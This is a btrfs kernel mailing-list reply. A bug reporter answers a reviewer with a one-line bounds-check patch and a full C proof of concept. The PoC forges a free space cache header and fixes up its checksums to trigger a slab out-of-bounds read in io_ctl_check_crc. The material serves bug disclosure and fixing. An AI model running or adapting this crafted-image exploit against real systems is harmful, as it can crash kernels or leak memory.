Received: from mail-pj1-f42.google.com (mail-pj1-f42.google.com [209.85.216.42])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 07B7F3242D7
	for <linux-btrfs@vger.kernel.org>; Tue,  9 Jun 2026 23:27:45 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.216.42
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1781047667; cv=none; b=mxZjUEiloJGc1fUrP0I5/KZweAsPrpT0gAje6XGZgoa0Tbmw0yTgNAI0FpCyhwVVSgw2vXUWweJcVwKwj+7cfmddkUfEsJq8Dht2ib0AG1TdKR6eo0OseHa8xG0GquTqjNb6Fn2ars15F6kG/CQ0Rtj30n1NtW4z+FPb+SHOb1A=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1781047667; c=relaxed/simple;
	bh=UqWfuKXWkEe47sPYquf7D/oC5xo+k3RwyGDm0NMW7ww=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=a4igJmqSkVS43W94hr3FB13WWa0XJpmx5Wb9FrvLPVCVX4EDlfCaVJYbRYqeIOO4+k+87VSuIAVuWgdW+DkGlv+2gw2Fc08I4qQWX38hB738jQh0Im1NTkI4LGGXX9gemv3kuuwKSvxzotYsGNJtCTuR7xohhlzYpCq0DWsZZhE=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu; spf=pass smtp.mailfrom=asu.edu; dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b=iNWRBWH8; arc=none smtp.client-ip=209.85.216.42
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=asu.edu
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b="iNWRBWH8"
Received: by mail-pj1-f42.google.com with SMTP id 98e67ed59e1d1-36b7b7b7a80so3804347a91.1
        for <linux-btrfs@vger.kernel.org>; Tue, 09 Jun 2026 16:27:45 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=asu.edu; s=google; t=1781047665; x=1781652465; darn=vger.kernel.org;
        h=in-reply-to:content-transfer-encoding:content-disposition
         :mime-version:references:message-id:subject:cc:to:from:date:from:to
         :cc:subject:date:message-id:reply-to;
        bh=uxZBAS+8EUIdLK9g4YCdtXKH6/qwBrekfMrHSt3wUn8=;
        b=iNWRBWH89v52ECo94wME+VmJrXr2ao6wWPsh5z19V4Oqk9JzyV3jDWBLkauhKuPjnD
         QCYVr6aXSh6v7l23W8y5/y9DeFTC7RJBwqfTr07ZOmakZ3gXBLEnNcbJ3c4U5LgAWsaG
         zCZA9wasZYQX+CXTCAHSp8vpLRwZMuEB4PW4ILPOAJ0LcmMmau398b6+ueqEnMvLCUbC
         z7G1YGNrwF3WuL6PVK0Je1EujGMobMSoaVXiz2McTzcl/9bxGsR8mrW99dSXDuwGmZbC
         sGB4JXgmOz1p37IcQkR7deVAclZ1X4tCY4vwEq+p7pr7DYsnmyhoSN2qTKz5J20MxRYU
         9BXA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1781047665; x=1781652465;
        h=in-reply-to:content-transfer-encoding:content-disposition
         :mime-version:references:message-id:subject:cc:to:from:date:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
        bh=uxZBAS+8EUIdLK9g4YCdtXKH6/qwBrekfMrHSt3wUn8=;
        b=CGesNjNb2TAhkJUKUFJkqvPOXEmhCSDRk0l6vu6kqiuXZhN2n7kHgtRJaOnnOtVyq4
         KLuk0U0EQbcKlh8W80KdzJZdQIIA1Et20GJ6biAjraqDqSi5uSSIdkirTKIKitIGWJku
         ZZ20Zt0AconiZh1sClsA7K+E2egne6dIjJyfi58fYAsqR2RfKPYznMSjmffMVliZAkWF
         8PBze2XkFX2tyCif3kBBCnT7OEyROyt0GRE0C9xkPqZp0Uv7B9xi34gaqiokASLw+R+F
         gTx3cQ6jHrosQ9AI411HQhoqD3V4IAMZkS1XY2r8+DfPFKdeRkZJIfocC893xSwQR4b3
         zYng==
X-Gm-Message-State: AOJu0YyrQnFo4SM6kHKlE4v2tfMdm5MaoBuRQxrBgSV0NlGlsjIy33j+
	XP+EdoygyQB+DMJ3xDvXb9nW/O2h98hcAJsbCgXyM5LJUAPqlk5HXJMtxrbxbUcH2g==
X-Gm-Gg: Acq92OFlzYcvu5xoNhdUMj4LHorWHWoNysbBo2GDfnkreNLwsFv/NiePoDdgOCuvHTW
	u8TKEVGGb2fJUf6Q8sfqmLahLKijhOB+sA4i3AOMQ70XKll7dGwP0t/gXpix+janRevf0qQWZdj
	BPYlbRfoAIj/AuJN2awPFm4Zog/cP9Yvkr3XoymzredC8tHj8subN69K9zIzaU/EDlntFBwal3+
	C7WmU7i942Mk7431ryoIO0pC/igK0tUiFf3P9qiws+GvaSGG+dde5AunGI1KqzxIWK9D2whUc8G
	NkIrKFZ3NrudyU7p/hCE3y5rZz/EVmTe3yo6UqTWhHzTjyJahSjn7JUuddiFk2IVa6F0tt+ZUfa
	kgicOZpJDzZBjoL8EeMSmJY2VCM1+lPONIbWC0Erb8JGwGkecyefVlNL7ooHdpGbPeTPGy3KbyF
	Ew+Mah8sFkOoUMsg86
X-Received: by 2002:a17:90b:254b:b0:35b:9e53:e2df with SMTP id 98e67ed59e1d1-3713029d5dfmr18745349a91.2.1781047665156;
        Tue, 09 Jun 2026 16:27:45 -0700 (PDT)
Received: from p1 ([2607:fb90:ec8e:a6b9:47db:17e8:cbbe:48c2])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-376246afe56sm552850a91.12.2026.06.09.16.27.44
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Tue, 09 Jun 2026 16:27:44 -0700 (PDT)
Date: Tue, 9 Jun 2026 16:27:42 -0700
From: Xiang Mei <xmei5@asu.edu>
To: Qu Wenruo <wqu@suse.com>
Cc: linux-btrfs@vger.kernel.org, David Sterba <dsterba@suse.com>, 
	Chris Mason <clm@fb.com>, Josef Bacik <josef@redhat.com>, 
	Weiming Shi <bestswngs@gmail.com>
Subject: Re: [PATCH btrfs] btrfs: reject free space cache with more entries
 than pages
Message-ID: <jnoeup5w2qznvycfqkoze6f3pv2dg6wgeoax4kiv743tmiapd3@fdmnmlat7a2a>
References: <20260609081135.2972081-1-xmei5@asu.edu>
 <5b33a684-f74c-41d5-8f95-11f76a0c7a35@suse.com>
Precedence: bulk
X-Mailing-List: linux-btrfs@vger.kernel.org
List-Id: <linux-btrfs.vger.kernel.org>
List-Subscribe: <mailto:linux-btrfs+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-btrfs+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Disposition: inline
Content-Transfer-Encoding: 8bit
In-Reply-To: <5b33a684-f74c-41d5-8f95-11f76a0c7a35@suse.com>

On Tue, Jun 09, 2026 at 06:32:15PM +0930, Qu Wenruo wrote:
> 
> 
> 在 2026/6/9 17:41, Xiang Mei 写道:
> > __load_free_space_cache() reads num_entries/num_bitmaps from the on-disk
> > struct btrfs_free_space_header, which the tree-checker does not validate.
> > The load loops consume that many records, remapping each exhausted page via
> > io_ctl_check_crc() -> io_ctl_map_page() (io_ctl->pages[io_ctl->index++]).
> > The write path bounds this index (io_ctl_add_entry()/io_ctl_add_bitmap()
> > check io_ctl->index >= io_ctl->num_pages before mapping), but the read path
> > does not, so a crafted header reads past the kzalloc'd pages[] array:
> > 
> >    BUG: KASAN: slab-out-of-bounds in io_ctl_check_crc
> >    Read of size 8 at addr ffff88800f948780 by task kworker/u8:3/58
> >    ...
> >     io_ctl_check_crc
> >     __load_free_space_cache
> >     load_free_space_cache
> >     caching_thread
> >     btrfs_work_helper
> >     ...
> > 
> 
> This comment applies to all involved poeple, not only you but also Weiming,
> who I guess are all from asu.edu, that you should provide more info about
> the context.
Thanks for the quick look, and fair point. We'll include more information
to reproduction.

Small correction on the ASU point: Weiming isn't from ASU, and while I am a
student there, this work is just the two of us doing bug hunting on our own
time: it's not affiliated with ASU, so the institution isn't relevant here.
The shortcoming is ours, and we'll fix it.

We appreciate the feedback and want to get our patches up to the standard
you expect.

> 
> Not just a simple calltrace makes little sense.
> 
> Since you have a reproducer, you should provide either the reproducer/image
> (if small enough), or provide a more detailed analyze of the corruption.
> 
> In your case, I know it's free space cache thus no easy dump, but you should
> still give an example of the corruption.
> 

We'll provide the PoC and method to trigger the bug:

1) Compile the kernel with the following config
CONFIG:
```
CONFIG_BTRFS_FS=y
CONFIG_BTRFS_ASSERT=n
```

2) Build the image with
```sh
#!/bin/sh
set -e
OUT="${1:-base.img}"
SIZE="${2:-2G}"

rm -f "$OUT"
truncate -s "$SIZE" "$OUT"
mkfs.btrfs -O ^free-space-tree -f "$OUT" >/dev/null
echo "wrote clean v1-cache btrfs image: $OUT ($SIZE)"
```

3) Run Qemu with
```sh
#!/bin/sh
set -e

qemu-system-x86_64 \
	-m 2G -smp 2 -enable-kvm -cpu host \
	-nographic -no-reboot \
	-kernel bzImage \
	-drive file=rootfs.img,if=virtio,format=raw \
	-drive file=base.img,if=virtio,format=raw \
	-append "console=ttyS0 root=/dev/vda rw nokaslr oops=panic panic=-1"
```

4) Use the following PoC to trigger the bug
```c
// SPDX-License-Identifier: GPL-2.0
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mount.h>
#include <sys/ioctl.h>

#ifndef DEV
#define DEV       "/dev/vdc"
#endif
#define MNT       "/mnt"
#define NODESIZE  16384
#define SECTOR    4096
#define HDR       0x65
#define ITEM      25
#define FSH_SIZE  41
#define NEW_ENTRIES 0x10000
static const uint64_t FREE_SPACE_OBJECTID = (uint64_t)(-11);

static uint32_t crc32c(const uint8_t *p, size_t n)
{
	uint32_t crc = ~0u;
	for (size_t i = 0; i < n; i++) {
		crc ^= p[i];
		for (int k = 0; k < 8; k++)
			crc = (crc >> 1) ^ (0x82F63B78u & (-(int32_t)(crc & 1)));
	}
	return ~crc;
}

static uint64_t rd64(const uint8_t *p){ uint64_t v; memcpy(&v,p,8); return v; }
static uint32_t rd32(const uint8_t *p){ uint32_t v; memcpy(&v,p,4); return v; }
static void wr64(uint8_t *p, uint64_t v){ memcpy(p,&v,8); }
static void wr32(uint8_t *p, uint32_t v){ memcpy(p,&v,4); }

static uint64_t logical_to_phys(uint8_t *m, off_t sz, uint64_t logical)
{
	for (off_t off = 0; off + HDR <= sz; off += SECTOR) {
		if (m[off + 0x64] != 0)
			continue;
		uint32_t nritems = rd32(m + off + 0x60);
		if (nritems == 0 || nritems > 2000)
			continue;
		for (uint32_t i = 0; i < nritems; i++) {
			off_t ip = off + HDR + (off_t)i * ITEM;
			if (ip + ITEM > sz) break;
			if (rd64(m + ip) != 256 || m[ip + 8] != 228)
				continue;
			uint64_t koff = rd64(m + ip + 9);
			off_t dp = off + HDR + rd32(m + ip + 17);
			if (dp + 64 > sz) continue;
			uint64_t length = rd64(m + dp);
			if (logical >= koff && logical < koff + length)
				return rd64(m + dp + 48 + 8) + (logical - koff);
		}
	}
	return logical;
}

static void forge_cache_page(uint8_t *m, off_t sz, uint64_t ino)
{
	for (off_t off = 0; off + HDR <= sz; off += SECTOR) {
		if (m[off + 0x64] != 0)
			continue;
		uint32_t nritems = rd32(m + off + 0x60);
		if (nritems == 0 || nritems > 2000)
			continue;
		for (uint32_t i = 0; i < nritems; i++) {
			off_t ip = off + HDR + (off_t)i * ITEM;
			if (ip + ITEM > sz) break;
			if (rd64(m + ip) != ino || m[ip + 8] != 108)
				continue;
			off_t dp = off + HDR + rd32(m + ip + 17);
			if (dp + 53 > sz) continue;
			uint64_t disk_bytenr = rd64(m + dp + 21);
			if (disk_bytenr == 0)
				continue;
			uint64_t num_bytes = rd64(m + dp + 45);
			int num_pages = num_bytes / 4096;
			if (num_pages < 1) num_pages = 1;
			off_t base = logical_to_phys(m, sz, disk_bytenr);
			if (base + (off_t)num_bytes > sz) continue;
			uint8_t *p0 = m + base;
			int crc_area = 4 * num_pages;
			uint64_t voff = 0x4000000ULL;
			for (int pg = 0; pg < num_pages; pg++) {
				uint8_t *p = p0 + (off_t)pg * 4096;
				int e = (pg == 0) ? (crc_area + 8) : 0;
				for (; e + 17 <= 4096; e += 17) {
					wr64(p + e, voff);
					wr64(p + e + 8, 0x1000);
					p[e + 16] = 1;
					voff += 0x100000ULL;
				}
			}
			for (int pg = 1; pg < num_pages; pg++)
				wr32(p0 + pg * 4, crc32c(p0 + (off_t)pg * 4096, 4096));
			wr32(p0 + 0, crc32c(p0 + crc_area, 4096 - crc_area));
			return;
		}
	}
}

static int patch_device(const char *dev)
{
	int fd = open(dev, O_RDWR);
	if (fd < 0) { perror("open"); return -1; }
	off_t sz = lseek(fd, 0, SEEK_END);
	uint8_t *m = malloc(sz);
	lseek(fd, 0, SEEK_SET);
	for (off_t got = 0; got < sz; ) {
		ssize_t r = read(fd, m + got, sz - got);
		if (r <= 0) break;
		got += r;
	}

	int patched = 0;
	for (off_t off = 0; off + HDR <= sz; off += SECTOR) {
		if (m[off + 0x64] != 0)
			continue;
		uint32_t nritems = rd32(m + off + 0x60);
		if (nritems == 0 || nritems > 2000)
			continue;
		int hit = 0;
		for (uint32_t i = 0; i < nritems; i++) {
			off_t ip = off + HDR + (off_t)i * ITEM;
			if (ip + ITEM > sz) break;
			uint32_t isize = rd32(m + ip + 21);
			if (rd64(m + ip) != FREE_SPACE_OBJECTID ||
			    m[ip + 8] != 0 || isize != FSH_SIZE)
				continue;
			off_t dptr = off + HDR + rd32(m + ip + 17);
			if (dptr + FSH_SIZE > sz) continue;
			uint64_t fino = rd64(m + dptr + 0);
			wr64(m + dptr + 25, NEW_ENTRIES);
			forge_cache_page(m, sz, fino);
			hit = 1; patched++;
		}
		if (hit)
			wr32(m + off, crc32c(m + off + 0x20, NODESIZE - 0x20));
	}
	lseek(fd, 0, SEEK_SET);
	for (off_t wr = 0; wr < sz; ) {
		ssize_t w = write(fd, m + wr, sz - wr);
		if (w <= 0) break;
		wr += w;
	}
	fsync(fd);
	close(fd);
	free(m);
	return patched;
}

#define BTRFS_IOC_SYNC _IO(0x94, 8)

static int mnt_v1(void)
{
	return mount(DEV, MNT, "btrfs", 0, "space_cache=v1");
}

static void churn(void)
{
	static char b[1 << 20];
	memset(b, 'F', sizeof b);
	for (int i = 0; i < 300; i++) {
		char p[64]; snprintf(p, sizeof p, MNT "/b%03d", i);
		int fd = open(p, O_CREAT | O_WRONLY, 0644);
		if (fd >= 0) { (void)!write(fd, b, sizeof b); fsync(fd); close(fd); }
	}
	sync();
	for (int i = 0; i < 300; i += 3) {
		char p[64]; snprintf(p, sizeof p, MNT "/b%03d", i);
		unlink(p);
	}
	sync();
}

static void bake_cache(void)
{
	static char big[8 << 20];
	memset(big, 'D', sizeof big);

	mnt_v1();
	int dfd = open(MNT, O_RDONLY | O_DIRECTORY);
	churn();
	for (int cyc = 0; cyc < 10; cyc++) {
		char p[64]; snprintf(p, sizeof p, MNT "/dirty%d", cyc);
		int t = open(p, O_CREAT | O_WRONLY, 0644);
		if (t >= 0) { (void)!write(t, big, sizeof big); fsync(t); close(t); }
		if (cyc > 0) {
			char q[64]; snprintf(q, sizeof q, MNT "/dirty%d", cyc - 1);
			unlink(q);
		}
		if (dfd >= 0) ioctl(dfd, BTRFS_IOC_SYNC, 0);
		sync();
	}
	if (dfd >= 0) close(dfd);
	umount(MNT);

	if (mnt_v1() == 0) {
		int t = open(MNT "/again", O_CREAT | O_WRONLY, 0644);
		if (t >= 0) { (void)!write(t, "y", 1); close(t); }
		churn(); sync(); sleep(1); umount(MNT);
	}
	if (mnt_v1() == 0) {
		int t = open(MNT "/again2", O_CREAT | O_WRONLY, 0644);
		if (t >= 0) { (void)!write(t, "z", 1); close(t); }
		sync(); sleep(1); umount(MNT);
	}
}

int main(void)
{
	mkdir(MNT, 0755);

	bake_cache();
	puts("[poc] baked v1 cache");

	printf("[poc] patched %d header(s)\n", patch_device(DEV));

	if (mnt_v1()) {
		perror("[poc] mount(trigger)");
		return 1;
	}
	puts("[poc] remounted; allocating to force block-group caching");
	for (int i = 0; i < 8; i++) {
		char p[64]; snprintf(p, sizeof p, MNT "/t%d", i);
		int fd = open(p, O_CREAT | O_WRONLY, 0644);
		if (fd >= 0) {
			char b[65536]; memset(b, 'a' + i, sizeof b);
			for (int j = 0; j < 16; j++)
				if (write(fd, b, sizeof b) < 0) break;
			fsync(fd); close(fd);
		}
	}
	sync();
	sleep(2);
	puts("[poc] no crash (kernel is patched?)");
	return 0;
}
```


Feel free to let us know if you can't reprodce this bug. We are glad to
help.
> 
> I'm not saying your reports provides no value, at least they are indeed
> going to enhance some error handling.
> 
> But your and Weiming's reports seldomly explain the full picture, just some
> random "crafted image", if you have the image, dump the content into the
> commit message.
> 
> The lack of transparency make it harder to review, especially hard to
> determine if this is really the earliest point that we can detect an index
> that overflows the page number.
>

We appriciate your review and would like to privde more information to
help. Thaks again for your tips.

Xiang
> > Bound io_ctl->index in io_ctl_check_crc() too. An over-long stream is then
> > treated as a corrupt cache, which the caller drops and rebuilds from the
> > extent tree, so no valid cache is rejected.
> > 
> > Fixes: 5b0e95bf607d ("Btrfs: inline checksums into the disk free space cache")
> > Reported-by: Weiming Shi <bestswngs@gmail.com>
> > Assisted-by: Claude:claude-opus-4-8
> > Signed-off-by: Xiang Mei <xmei5@asu.edu>
> > ---
> >   fs/btrfs/free-space-cache.c | 3 +++
> >   1 file changed, 3 insertions(+)
> > 
> > diff --git a/fs/btrfs/free-space-cache.c b/fs/btrfs/free-space-cache.c
> > index ab22e4f9ffdd..bbc4db7fe74b 100644
> > --- a/fs/btrfs/free-space-cache.c
> > +++ b/fs/btrfs/free-space-cache.c
> > @@ -555,6 +555,9 @@ static int io_ctl_check_crc(struct btrfs_io_ctl *io_ctl, int index)
> >   	u32 crc = ~(u32)0;
> >   	unsigned offset = 0;
> > +	if (index >= io_ctl->num_pages)
> > +		return -EIO;
> > +
> >   	if (index == 0)
> >   		offset = sizeof(u32) * io_ctl->num_pages;
> 
